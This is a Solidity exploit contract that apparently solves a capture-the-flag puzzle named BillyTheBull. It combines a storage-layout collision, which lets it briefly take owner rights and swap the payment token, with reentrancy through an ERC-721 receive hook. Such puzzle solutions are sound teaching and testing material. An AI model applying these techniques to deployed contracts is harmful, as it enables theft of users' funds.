// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { FreeWilly } from "../src/tokens/FreeWilly.sol";
import { FlagHolder } from "./FlagHolder.sol";

contract Exploiter {
    address owner;
    NFTOutlet nftOutlet;
    uint nftPrice;
    uint[1] _gap;
    bool flag;
    BillyTheBull public immutable puzzle;
    address public immutable willy;
    uint public immutable t1;
    uint public immutable t2;
    bytes32 public immutable salt;
    FlagHolder public immutable flagHolder;

    constructor(uint _t1, uint _t2, bytes32 _salt, address _puzzle, address _willy, FlagHolder _flagHolder) {
        t1 = _t1;
        t2 = _t2;
        salt = _salt;
        puzzle = BillyTheBull(_puzzle);
        nftOutlet = NFTOutlet(puzzle.nftOutlet());
        willy = _willy;
        flagHolder = FlagHolder(_flagHolder);

        uint indexToMint = puzzle.nftPrice();
        FreeWilly(_willy).mint(indexToMint);
        FreeWilly(_willy).mint(indexToMint + 1e18);
        FreeWilly(_willy).setApprovalForAll(address(nftOutlet), true);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            uint solution = uint(keccak256(flagHolder.FLAG()));
            puzzle.verify(t2 << 128 | t1, solution);
        }
        return this.onERC721Received.selector;
    }

    function getMagicFlag() external returns (bytes memory) {
        if (address(NFTOutlet(nftOutlet).paymentToken()) == willy) {
            return abi.encode(keccak256(abi.encode(t1)));
        } else {
            address oldOwner = owner;
            owner = address(this);
            nftOutlet.changePaymentToken(willy);
            owner = oldOwner;
            return flagHolder.FLAG();
        }
    }
}
